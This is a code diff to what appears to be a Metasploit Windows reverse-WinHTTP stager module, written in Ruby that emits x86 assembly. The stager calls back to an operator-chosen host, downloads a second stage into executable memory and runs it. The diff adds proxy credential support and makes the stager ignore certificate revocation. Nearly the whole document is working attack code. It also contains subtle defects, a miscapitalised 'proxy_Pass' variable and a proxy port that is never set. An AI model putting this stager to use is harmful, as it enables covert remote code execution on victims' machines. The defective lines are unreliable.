@@ -36,11 +36,11 @@ module Payload::Windows::ReverseWinHttp
       conf[:url]              = generate_uri
       conf[:exitfunk]         = datastore['EXITFUNC']
       conf[:verify_cert_hash] = opts[:verify_cert_hash]
-      confg[:proxy_host]      = datastore['PayloadProxyHost']
-      confg[:proxy_user]      = datastore['PayloadProxyUser']
-      confg[:proxy_pass]      = datastore['PayloadProxyPass']
-      confg[:proxy_type]      = datastore['PayloadProxyType']
-      confg[:retry_count]     = datastore['StagerRetryCount']
+      conf[:proxy_host]       = datastore['PayloadProxyHost']
+      conf[:proxy_user]       = datastore['PayloadProxyUser']
+      conf[:proxy_pass]       = datastore['PayloadProxyPass']
+      conf[:proxy_type]       = datastore['PayloadProxyType']
+      conf[:retry_count]      = datastore['StagerRetryCount']
     end
 
     generate_reverse_winhttp(conf)
@@ -121,6 +121,27 @@ module Payload::Windows::ReverseWinHttp
       encoded_cert_hash = opts[:verify_cert_hash].unpack("C*").map{|c| "0x%.2x" % c }.join(",")
     end
 
+    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
+    proxy_info    = ""
+
+    if proxy_enabled
+      if opts[:proxy_type].to_s.downcase == "socks"
+        proxy_info << "socks="
+      else
+        proxy_info << "http://"
+      end
+
+      proxy_info << opts[:proxy_host].to_s
+      if opts[:proxy_port].to_i > 0
+        proxy_info << ":#{opts[:proxy_port]}"
+      end
+
+      proxy_info = asm_generate_wchar_array(proxy_info)
+    end
+
+    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_user])
+    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_pass])
+
     http_open_flags = 0
     secure_flags = 0
 
@@ -133,7 +154,8 @@ module Payload::Windows::ReverseWinHttp
         0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
         0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
         0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
-        0x00000100 ) # SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        0x00000100 | # SECURITY_FLAG_IGNORE_UNKNOWN_CA
+        0x00000080 ) # SECURITY_FLAG_IGNORE_REVOCATION
     else
       http_open_flags = 0x00000100 # WINHTTP_FLAG_BYPASS_PROXY_CACHE
     end
@@ -146,7 +168,7 @@ module Payload::Windows::ReverseWinHttp
         push 0x00707474        ; Push the string 'winhttp',0
         push 0x686E6977        ; ...
         push esp               ; Push a pointer to the "winhttp" string
-        push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp               ; LoadLibraryA( "winhttp" )
       ^
 
@@ -156,24 +178,43 @@ module Payload::Windows::ReverseWinHttp
         push 0x00323374        ; Push the string 'crypt32',0
         push 0x70797263        ; ...
         push esp               ; Push a pointer to the "crypt32" string
-        push 0x0726774C        ; hash( "kernel32.dll", "LoadLibraryA" )
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp               ; LoadLibraryA( "wincrypt" )
       ^
     end
 
     asm << %Q^
-
-      xor ebx, ebx
+        xor ebx, ebx
 
       WinHttpOpen:
+    ^
+
+    if proxy_enabled
+      asm << %Q^
+        push ebx               ; Flags
+        push esp               ; ProxyBypass ("")
+      call get_proxy_server
+        db "#{proxy_info}", 0x00
+      get_proxy_server:
+                               ; ProxyName (via call)
+        push 3                 ; AccessType (NAMED_PROXY= 3)
+        push ebx               ; UserAgent (NULL) [1]
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
+        call ebp
+      ^
+    else
+      asm << %Q^
         push ebx               ; Flags
         push ebx               ; ProxyBypass (NULL)
         push ebx               ; ProxyName (NULL)
         push ebx               ; AccessType (DEFAULT_PROXY= 0)
         push ebx               ; UserAgent (NULL) [1]
-        push 0xBB9D1F04        ; hash( "winhttp.dll", "WinHttpOpen" )
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
         call ebp
+      ^
+    end
 
+    asm << %Q^
       WinHttpConnect:
         push ebx               ; Reserved (NULL)
         push #{opts[:port]}    ; Port [3]
@@ -182,7 +223,7 @@ module Payload::Windows::ReverseWinHttp
         db #{encoded_url}
       got_server_host:
         push eax               ; Session handle returned by WinHttpOpen
-        push 0xC21E9B46        ; hash( "winhttp.dll", "WinHttpConnect" )
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')}
         call ebp
 
       WinHttpOpenRequest:
@@ -194,10 +235,43 @@ module Payload::Windows::ReverseWinHttp
         push edi               ; ObjectName (URI)
         push ebx               ; Verb (GET method) (NULL)
         push eax               ; Connect handle returned by WinHttpConnect
-        push 0x5BB31098        ; hash( "winhttp.dll", "WinHttpOpenRequest" )
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpenRequest')}
         call ebp
         xchg esi, eax          ; save HttpRequest handler in esi
       ^
+
+    if proxy_enabled && proxy_user
+      asm << %Q^
+        push ebx               ; pAuthParams (NULL)
+      ^
+
+      if proxy_Pass
+        asm << %Q^
+        call got_proxy_pass    ; put proxy_pass on the stack
+      proxy_pass:
+        db #{proxy_pass}
+      got_proxy_pass:
+                               ; pwszPassword now on the stack
+        ^
+      else
+        asm << %Q^
+        push ebx               ; pAuthParams (NULL)
+        ^
+      end
+
+      asm << %Q^
+        call got_proxy_user    ; put proxy_user on the stack
+      proxy_user:
+        db #{proxy_user}
+      got_proxy_user:
+                               ; pwszUserName now on the stack
+        push 1                 ; AuthScheme (WINHTTP_AUTH_SCHEME_BASIC = 1)
+        push 1                 ; AuthTargets (WINHTTP_AUTH_TARGET_PROXY = 1)
+        push esi               ; hRequest
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetCredentials')}
+        call ebp
+      ^
+    end
 
     if opts[:ssl]
       asm << %Q^
@@ -209,7 +283,7 @@ module Payload::Windows::ReverseWinHttp
         push eax               ; &buffer
         push 31                ; DWORD dwOption (WINHTTP_OPTION_SECURITY_FLAGS)
         push esi               ; hHttpRequest
-        push 0xCE9D58D3        ; hash( "winhttp.dll", "WinHttpSetOption" )
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
         call ebp
       ^
     end
@@ -230,7 +304,7 @@ module Payload::Windows::ReverseWinHttp
         push ebx               ; HeadersLength (0) [3]
         push ebx               ; Headers (NULL) [2]
         push esi               ; HttpRequest handle returned by WinHttpOpenRequest [1]
-        push 0x91BB5895        ; hash( "winhttp.dll", "WinHttpSendRequest" )
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')}
         call ebp
         test eax,eax
         jnz check_response     ; if TRUE call WinHttpReceiveResponse API
@@ -274,7 +348,7 @@ module Payload::Windows::ReverseWinHttp
         push ebx             ; &buffer
         push 78              ; DWORD dwOption (WINHTTP_OPTION_SERVER_CERT_CONTEXT)
         push esi             ; hHttpRequest
-        push 0x272F0478      ; hash( "winhttp.dll", "WinHttpQueryOption" )
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
         call ebp
         test eax, eax        ;
         jz failure           ; Bail out if we couldn't get the certificate context
@@ -291,7 +365,7 @@ module Payload::Windows::ReverseWinHttp
         push edi             ; &buffer (20-byte SHA1 hash)
         push 3               ; DWORD dwPropId (CERT_SHA1_HASH_PROP_ID)
         push [ebx]           ; *pCert
-        push 0xC3A96E2D      ; hash( "crypt32.dll", "CertGetCertificateContextProperty" )
+        push #{Rex::Text.block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
         call ebp
         test eax, eax        ;
         jz failure           ; Bail out if we couldn't get the certificate context
@@ -328,7 +402,7 @@ module Payload::Windows::ReverseWinHttp
                                ; first to get a valid handle for WinHttpReadData
         push ebx               ; Reserved (NULL)
         push esi               ; Request handler returned by WinHttpSendRequest
-        push 0x709D8805        ; hash( "winhttp.dll", "WinHttpReceiveResponse" )
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')}
         call ebp
         test eax,eax
         jz failure
@@ -338,7 +412,7 @@ module Payload::Windows::ReverseWinHttp
         push 0x1000            ; MEM_COMMIT
         push 0x00400000        ; Stage allocation (4Mb ought to do us)
         push ebx               ; NULL as we dont care where the allocation is
-        push 0xE553A458        ; hash( "kernel32.dll", "VirtualAlloc" )
+        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
         call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
       download_prep:
@@ -352,7 +426,7 @@ module Payload::Windows::ReverseWinHttp
         push 8192              ; NumberOfBytesToRead
         push ebx               ; Buffer
         push esi               ; Request handler returned by WinHttpReceiveResponse
-        push 0x7E24296C        ; hash( "winhttp.dll", "WinHttpReadData" )
+        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')}
         call ebp
 
         test eax,eax           ; if download failed? (optional?)
